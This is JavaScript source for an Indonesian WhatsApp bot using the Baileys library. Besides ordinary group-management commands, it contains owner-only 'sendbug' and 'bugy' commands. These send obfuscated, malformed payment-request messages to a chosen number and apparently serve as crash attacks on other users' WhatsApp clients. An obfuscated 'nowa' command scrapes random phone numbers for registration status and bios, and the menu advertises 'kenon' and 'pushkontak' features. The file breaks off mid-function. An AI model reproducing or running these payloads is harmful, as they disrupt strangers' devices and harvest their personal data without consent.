"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./lib/console.js')
const { isUrl, getRandom, getGroupAdmins, runtime, sleep, reSize, makeid, fetchJson, getBuffer } = require("./lib/myfunc");


// apinya
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");

// Database
const setting = JSON.parse(fs.readFileSync('./setting.json'));
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const mess = JSON.parse(fs.readFileSync('./mess.json'));
const welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
const db_error = JSON.parse(fs.readFileSync('./database/error.json'));
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
const { ngazap } = require('./lib/ngazap')
const { generateProfilePicture, parseMention, jsonformat } = require('./lib/myfunc2')

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(kaje, msg, m, setting, store) => {
try {
let { ownerNumber, botName } = setting
let { linkyt, linkig } = setting
let { linkthumb } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = kaje.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await kaje.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const isAntiLink = antilink.includes(from) ? true : false
const isWelcome = isGroup ? welcome.includes(from) : false

// Quoted
const quoted = msg.quoted ? msg.quoted : msg
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = kaje.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = kaje.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

async function downloadAndSaveMediaMessage (type_file, path_file) {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
fs.writeFileSync(path_file, buffer)
return path_file } 
else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file}
}

const reply = (teks) => {kaje.sendMessage(from, { text: teks }, { quoted: msg })}

//Antilink
if (isGroup && isAntiLink && isBotGroupAdmins){
if (chats.includes(`https://chat.whatsapp.com/`) || budy.includes(`http://chat.whatsapp.com/`)) {
if (!isBotGroupAdmins) return ads('Untung bot bukan admin')
if (isOwner) return ads('Untung lu owner ku:v😙')
if (isGroupAdmins) return ads('Admin grup mah bebas ygy🤭')
if (fromMe) return ads('bot bebas Share link')
await kaje.sendMessage(from, { delete: msg.key })
ads(`*「 GROUP LINK DETECTOR 」*\n\nTerdeteksi mengirim link group,Maaf sepertinya kamu akan di kick`)
kaje.groupParticipantsUpdate(from, [sender], "remove")
}
}

const ads = (teks) => {
kaje.sendMessage(from, {text: teks,
contextInfo:{
"externalAdReply": {"title": `CASPER WUSHIR`,
"body": `SUBREK YETE ANE`,
mimetype: 'audio/mpeg',
caption: `APALAH`,
showAdAttribution: true,
sourceUrl: `${linkig}`,
thumbnailUrl: `${linkthumb}`, }
}}, {quoted : msg})
}
const adsAudio = (teks) => {
kaje.sendMessage(from, {audio: {url: `./gambar/${teks}.mp3`}, mimetype:'audio/mpeg', ptt:true,
contextInfo:{
"externalAdReply": {"title": `CASPER WUSHIR`,
"body": `SUBREK YETE ANE`,
mimetype: 'audio/mpeg',
caption: `APALAH`,
showAdAttribution: true,
sourceUrl: `${linkyt}`,
thumbnailUrl: `${linkthumb}`, }
}}, {quoted : msg})
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return kaje.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

const bugy = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": `${ngazap(prefix)}`,
"previewType": `${ngazap(prefix)}`,
"contextInfo": {
"stanzaId": `${ngazap(prefix)}`,
"participant": "@s.whatsapp.net"
	}}}}	

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Created By ${setting.ownerName}\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${setting.botName},;;;\nFN:Halo ${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: setting.thumb }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}


// Console
if (isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

// Casenya
switch(command) {
	case 'help':
	case 'menu':{
	let menu = `
┏━━━◧『 𝘿𝘼𝙏𝘼 𝘽𝙊𝙏 』
┃
┣» ᴄʀᴇᴀᴛᴏʀ : @${setting.kontakOwner}
┣» ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
┣» ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName} 
┣» ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ
┃
┗━━━━━━━━━━━━◧
┏━━━◧『 𝐌𝐄𝐍𝐔 』
┃
┣» .ownermenu
┣» .grupmenu
┣» .publikmenu
┃
┗━━━━━━━━━━━━◧`
let lagu = `bot`
ads(menu)
adsAudio(lagu)
}
break
case 'ownermenu':{
	let ownmenu = `
┏━━━◧『 𝘿𝘼𝙏𝘼 𝘽𝙊𝙏 』
┃
┣» ᴄʀᴇᴀᴛᴏʀ : @${setting.kontakOwner}
┣» ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
┣» ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName} 
┣» ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ
┃
┗━━━━━━━━━━━━◧
┏━━━◧『 𝐌𝐄𝐍𝐔 』
┃
┣» .nowa 62882xx888888
┣» .sticker
┣» .block
┣» .unblock
┣» .unban +62xxx
┣» .kenon +62xxx
┣» .pushkontak text
┣» .join linknye
┣» .leave
┣» .setppbot /full
┃
┣» .tambah
┣» .kali
┣» .kurang
┣» .bagi
┗━━━━━━━━━━━━◧`
ads(ownmenu)
}
break
case 'grupmenu':{
	let gcmenu = `
┏━━━◧『 𝘿𝘼𝙏𝘼 𝘽𝙊𝙏 』
┃
┣» ᴄʀᴇᴀᴛᴏʀ : @${setting.kontakOwner}
┣» ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
┣» ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName} 
┣» ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ
┃
┗━━━━━━━━━━━━◧
┏━━━◧『 𝐌𝐄𝐍𝐔 』
┃
┣» .grup close/open
┣» .welcome on/off
┣» .kick
┣» .hidetag
┣» .antilink
┣» .setname text
┣» .setdesk text
┃
┗━━━━━━━━━━━━◧`
ads(gcmenu)
}
break
case 'publikmenu':{
	let pubmenu = `
┏━━━◧『 𝘿𝘼𝙏𝘼 𝘽𝙊𝙏 』
┃
┣» ᴄʀᴇᴀᴛᴏʀ : @${setting.kontakOwner}
┣» ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
┣» ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName} 
┣» ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ
┃
┗━━━━━━━━━━━━◧
┏━━━◧『 𝐌𝐄𝐍𝐔 』
┃
┣» .traps
┃
┗━━━━━━━━━━━━◧`
ads(pubmenu)
}
break

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
case 'hidetag':
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
kaje.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'antilink':{
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
if (!args[0]) return ads(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return ads('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
ads('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return ads('Antilink belum aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
ads('Successfully Disabling Antilink In This Group')
} else { ads('Kata kunci tidak ditemukan!') }
}
break
case 'group':
case 'grup':
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
if (!q) return ads(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
kaje.groupSettingUpdate(from, 'announcement')
ads(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
kaje.groupSettingUpdate(from, 'not_announcement')
ads(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
ads(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'kick':
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
kaje.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
ads(`*Sukses mengeluarkan member..!*`))
.catch((err) => ads(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg.sender
kaje.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
ads(`*Sukses mengeluarkan member..!*`))
.catch((err) => ads(mess.error.api))
} else {
ads(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
}
break
case 'welcome':{
if (!isGroup) return ads('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return ads("Mau ngapain?, Fitur ini khusus admin")
if (!args[0]) return ads('*Kirim Format*\n\n.welcome on\n.welcome off')
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return ads('Sudah aktif✓')
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
ads('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
var posi = welcome.indexOf(from)
welcome.splice(posi, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
ads('Success menonaktifkan welcome di group:\n'+groupName)
} else { ads('Kata kunci tidak ditemukan!') }
}
break
case 'block':{
if (!isOwner && !fromMe) return
if (!q) return ads(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await kaje.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
ads('Sukses Block Nomor')
}
break
case 'unblock':{
if (!isOwner && !fromMe) return
if (!q) return ads(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await kaje.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
ads('Sukses Unblock Nomor')
}
break
case 'sticker': case 's': case 'stiker':{
if (!isOwner && !fromMe) return
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./gambar/${tanggal}.jpg`)
ads(mess.wait)
kaje.sendImageAsSticker(from, media, msg, { packname: `${setting.namaStore}`, author: `Store Bot`})
} else if (isVideo || isQuotedVideo) {
let media = await downloadAndSaveMediaMessage('video', `./sticker/${tanggal}.mp4`)
ads(mess.wait)
kaje.sendVideoAsSticker(from, media, msg, { packname: `${setting.namaStore}`, author: `Store Bot`})
} else {
ads(`Kirim/reply gambar/vidio dengan caption *${prefix+command}*`)
}
}
break
case 'setpp':
case 'setppbot': {
if (!isOwner && !fromMe) return
if (isImage || isQuotedImage) {
var medis = await downloadAndSaveMediaMessage('image', 'ppbot.jpeg')
ads(mess.wait)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await kaje.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(mess.success)
} else {
var memeg = await kaje.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
} else if (isVideo || isQuotedVideo) { ads('cuma bisa pake gambar dek')
}
}
break
case 'setname':
case 'setsubject': {
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
if (!q) return 'Text ?'
await kaje.groupUpdateSubject(from, q).then((res) => ads(mess.success)).catch((err) => ads(jsonformat(err)))
}
break
case 'setdesc':
case 'setdesk': {
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
if (!q) return 'Text ?'
await kaje.groupUpdateDescription(from, q).then((res) => ads(mess.success)).catch((err) => ads(jsonformat(err)))
}
break
case 'add': {
if (!isOwner && !fromMe) return ads('fitur ini hanya untuk owner')
if (!isGroup) return ads(mess.OnlyGroup)
if (!isGroupAdmins) return ads(mess.GrupAdmin)
if (!isBotGroupAdmins) return ads(mess.BotAdmin)
let users = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
await kaje.groupParticipantsUpdate(from, [users], 'add').then((res) => ads(jsonformat(res))).catch((err) => ads(jsonformat(err)))
}
break
case 'join': {
if (!isOwner && !fromMe) return
if (!q) return 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
ads(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kaje.groupAcceptInvite(result).then((res) => ads(jsonformat(res))).catch((err) => ads(jsonformat(err)))
}
break
case 'leave': {
if (!isOwner && !fromMe) return
await kaje.groupLeave(from).then((res) => ads(jsonformat(res))).catch((err) => ads(jsonformat(err)))
}
break
case 'nowa': {
if (!isOwner && !fromMe) return
if (!args[0]) return ads(`Kirim perintah ${prefix+command} <nomer>`)
var _0x10e293=_0x25dd;(function(_0x12c5dd,_0x5ed287){var _0x4a9c69=_0x25dd,_0x2b6299=_0x12c5dd();while(!![]){try{var _0xccbd6b=parseInt(_0x4a9c69(0x12a))/0x1*(parseInt(_0x4a9c69(0x12c))/0x2)+-parseInt(_0x4a9c69(0x132))/0x3+-parseInt(_0x4a9c69(0x131))/0x4*(-parseInt(_0x4a9c69(0x121))/0x5)+parseInt(_0x4a9c69(0x13a))/0x6*(parseInt(_0x4a9c69(0x139))/0x7)+parseInt(_0x4a9c69(0x134))/0x8*(parseInt(_0x4a9c69(0x122))/0x9)+-parseInt(_0x4a9c69(0x137))/0xa+parseInt(_0x4a9c69(0x125))/0xb*(-parseInt(_0x4a9c69(0x136))/0xc);if(_0xccbd6b===_0x5ed287)break;else _0x2b6299['push'](_0x2b6299['shift']());}catch(_0x3ca4e4){_0x2b6299['push'](_0x2b6299['shift']());}}}(_0x55d2,0xab25c));var noteks=args[0x0];if(!noteks['includes']('x'))return ads('lah?');ads(mess['wait']);function countInstances(_0x4d3091,_0x5b535c){var _0x380392=_0x25dd;return _0x4d3091[_0x380392(0x12e)](_0x5b535c)[_0x380392(0x12b)]-0x1;}var nomer0=noteks[_0x10e293(0x12e)]('x')[0x0],nomer1=noteks[_0x10e293(0x12e)]('x')[countInstances(noteks,'x')]?noteks[_0x10e293(0x12e)]('x')[countInstances(noteks,'x')]:'',random_length=countInstances(noteks,'x'),random;if(random_length==0x1)random=0xa;else{if(random_length==0x2)random=0x64;else random_length==0x3&&(random=0x3e8);}var nomerny='LIST\x20NOMER\x20WHATSAPP\x0a\x0aPunya\x20Bio/status/info\x0a',no_bio=_0x10e293(0x128),no_watsap=_0x10e293(0x126);for(let i=0x0;i<random;i++){var nu=['1','2','3','4','5','6','7','8','9'],dom1=nu[Math[_0x10e293(0x133)](Math[_0x10e293(0x12f)]()*nu[_0x10e293(0x12b)])],dom2=nu[Math[_0x10e293(0x133)](Math[_0x10e293(0x12f)]()*nu[_0x10e293(0x12b)])],dom3=nu[Math[_0x10e293(0x133)](Math['random']()*nu[_0x10e293(0x12b)])],dom4=nu[Math[_0x10e293(0x133)](Math[_0x10e293(0x12f)]()*nu[_0x10e293(0x12b)])],rndm;if(random_length==0x1)rndm=''+dom1;else{if(random_length==0x2)rndm=''+dom1+dom2;else{if(random_length==0x3)rndm=''+dom1+dom2+dom3;else random_length==0x4&&(rndm=''+dom1+dom2+dom3+dom4);}}var anu=await kaje['onWhatsApp'](''+nomer0+i+nomer1+_0x10e293(0x138)),anuu=anu['length']!==0x0?anu:![];try{try{var anu1=await kaje[_0x10e293(0x13b)](anu[0x0]['jid']);}catch{var anu1='401';}anu1==_0x10e293(0x130)||anu1['status']['length']==0x0?no_bio+='wa.me/'+anu[0x0][_0x10e293(0x135)][_0x10e293(0x12e)]('@')[0x0]+'\x0a':nomerny+=_0x10e293(0x123)+anu[0x0][_0x10e293(0x135)][_0x10e293(0x12e)]('@')[0x0]+'\x0aBiography\x20:\x20'+anu1[_0x10e293(0x124)]+'\x0aDate\x20:\x20'+moment(anu1[_0x10e293(0x127)])['tz'](_0x10e293(0x12d))['format'](_0x10e293(0x129))+'\x0a\x0a';}catch{no_watsap+=''+nomer0+i+nomer1+'\x0a';}}function _0x25dd(_0x1db011,_0x4f9d4c){var _0x55d239=_0x55d2();return _0x25dd=function(_0x25dd6d,_0x1fe34b){_0x25dd6d=_0x25dd6d-0x121;var _0x25b648=_0x55d239[_0x25dd6d];return _0x25b648;},_0x25dd(_0x1db011,_0x4f9d4c);}function _0x55d2(){var _0x2667fc=['wa.me/','status','36861zUAlbX','\x0aTidak\x20Terdaftar\x0a','setAt','\x0aTanpa\x20Bio/status/info\x20||\x20\x0aHey\x20there!\x20I\x20am\x20using\x20WhatsApp.\x0a','HH:mm:ss\x20DD/MM/YYYY','1BGwRzi','length','844878FWsBGj','Asia/Jakarta','split','random','401','17396OAAaKV','3534759lTWwls','floor','16zyBBJj','jid','1920zzwgOJ','1601140IODeLE','@s.whatsapp.net','5789mMWCBd','9510fsSuhO','fetchStatus','515GXZJHO','1774647LDvIow'];_0x55d2=function(){return _0x2667fc;};return _0x55d2();}ads(''+nomerny+no_bio+no_watsap);
adsAudio("jawacidra")
}
break
case 'sendbug' : {
if (!isOwner && !fromMe) return
if (!args[0]) return ads(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
function _0x4654(){var _0x495184=['audio/mpeg','28bgfYYL','kak','🔥\x20','https://telegra.ph/file/a5e229afeb4dad4f35204.jpg','DEVELOPER\x20f\x20u\x20s','164841JYdgmM','4898792ktoEoL','18qvuajv','864620gJYkjh','IDR','relayMessage','168066evmlDq','287bUgTYe','2396905nritPc','800811WkizdR','520comGLu','152330GILvEG'];_0x4654=function(){return _0x495184;};return _0x4654();}function _0x35ad(_0x169504,_0x239822){var _0x4654d4=_0x4654();return _0x35ad=function(_0x35ada2,_0x3a51b6){_0x35ada2=_0x35ada2-0x162;var _0x7bc31d=_0x4654d4[_0x35ada2];return _0x7bc31d;},_0x35ad(_0x169504,_0x239822);}var _0x4af0e=_0x35ad;(function(_0xdd25f1,_0x4f6313){var _0x210c42=_0x35ad,_0x4d78a5=_0xdd25f1();while(!![]){try{var _0xa58c56=-parseInt(_0x210c42(0x166))/0x1+parseInt(_0x210c42(0x170))/0x2+-parseInt(_0x210c42(0x16d))/0x3*(parseInt(_0x210c42(0x168))/0x4)+-parseInt(_0x210c42(0x163))/0x5+parseInt(_0x210c42(0x173))/0x6*(-parseInt(_0x210c42(0x162))/0x7)+parseInt(_0x210c42(0x16e))/0x8*(-parseInt(_0x210c42(0x16f))/0x9)+parseInt(_0x210c42(0x165))/0xa*(parseInt(_0x210c42(0x164))/0xb);if(_0xa58c56===_0x4f6313)break;else _0x4d78a5['push'](_0x4d78a5['shift']());}catch(_0x3d8a01){_0x4d78a5['push'](_0x4d78a5['shift']());}}}(_0x4654,0xca439),kaje['sendMessage'](target,{'audio':{'url':'./gambar/jawacidra.mp3'},'mimetype':_0x4af0e(0x167),'ptt':!![]},{'quoted':bugy}),kaje[_0x4af0e(0x172)](target,{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':''+ngazap(prefix),'currencyCodeIso4217':_0x4af0e(0x171),'requestFrom':'0@s.whatsapp.net','expiryTimestamp':0x1f40,'amount':0x1,'contextInfo':{'externalAdReply':{'title':_0x4af0e(0x16c),'body':_0x4af0e(0x169),'mimetype':_0x4af0e(0x167),'caption':_0x4af0e(0x16a)+ngazap(prefix)+'\x20'+ngazap(prefix),'ptt':!![],'showAdAttribution':!![],'sourceUrl':'h','thumbnailUrl':_0x4af0e(0x16b)}}}}}},{'quoted':m}));
}
break
case 'bugy' : {
if (!isOwner && !fromMe) return
var _0x28c8d6=_0x2561;(function(_0x475bb9,_0x14eae4){var _0x2275ae=_0x2561,_0x162238=_0x475bb9();while(!![]){try{var _0x35e339=-parseInt(_0x2275ae(0x1c7))/0x1*(-parseInt(_0x2275ae(0x1d3))/0x2)+parseInt(_0x2275ae(0x1d2))/0x3+-parseInt(_0x2275ae(0x1c5))/0x4+-parseInt(_0x2275ae(0x1d0))/0x5+parseInt(_0x2275ae(0x1c9))/0x6+-parseInt(_0x2275ae(0x1d4))/0x7*(parseInt(_0x2275ae(0x1cf))/0x8)+parseInt(_0x2275ae(0x1ca))/0x9*(-parseInt(_0x2275ae(0x1cb))/0xa);if(_0x35e339===_0x14eae4)break;else _0x162238['push'](_0x162238['shift']());}catch(_0x323367){_0x162238['push'](_0x162238['shift']());}}}(_0x5239,0x8baa2),kaje['sendMessage'](from,{'audio':{'url':_0x28c8d6(0x1cd)},'mimetype':_0x28c8d6(0x1ce),'ptt':!![]},{'quoted':bugy}),kaje[_0x28c8d6(0x1c6)](from,{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':''+ngazap(prefix),'currencyCodeIso4217':_0x28c8d6(0x1cc),'requestFrom':_0x28c8d6(0x1c4),'expiryTimestamp':0x1f40,'amount':0x1,'contextInfo':{'externalAdReply':{'title':'DEVELOPER\x20j\x20g\x20ᴡ','body':_0x28c8d6(0x1c8),'mimetype':_0x28c8d6(0x1ce),'caption':'🔥\x20'+ngazap(prefix)+'\x20'+ngazap(prefix),'showAdAttribution':!![],'sourceUrl':'https://y','thumbnailUrl':_0x28c8d6(0x1d1)}}}}}},{'quoted':m}));function _0x2561(_0xdb0591,_0x2007ca){var _0x52399b=_0x5239();return _0x2561=function(_0x2561d2,_0x569b01){_0x2561d2=_0x2561d2-0x1c4;var _0x4165d4=_0x52399b[_0x2561d2];return 